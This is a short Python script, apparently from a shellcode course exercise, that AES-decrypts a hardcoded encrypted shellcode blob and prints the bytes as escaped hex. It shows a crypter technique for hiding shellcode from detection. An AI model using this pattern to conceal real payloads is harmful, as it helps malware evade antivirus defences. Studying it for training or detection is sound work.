from Crypto.Cipher import AES
 
shellcode = ("\xc9\xc9\x0f\xaf\xf8\x6c\x82\x69\xa6\x95\x25\x1e\xdd\x5e\xbc\x79\xd0\xec\xdb\xa5\x81\xa0\xfe\x55\x56\x6d\xe8\x7a\xed\x08\xc9\x99")

key = ("SecurityTubeSLAE") # must be 16 bytes

iv = ("l0lZ") * 4 # must be 16 bytes
 
cipher = AES.new(key, AES.MODE_CBC, iv)
padnumber=int("7") 
decrypt = cipher.decrypt(shellcode)
encoded = ""     

for x in bytearray(decrypt):
	  encoded += '\\x'
	  dec = '%02x' % x#(x & 0xff)
	  encoded += dec
 
print encoded[0:-padnumber*4]

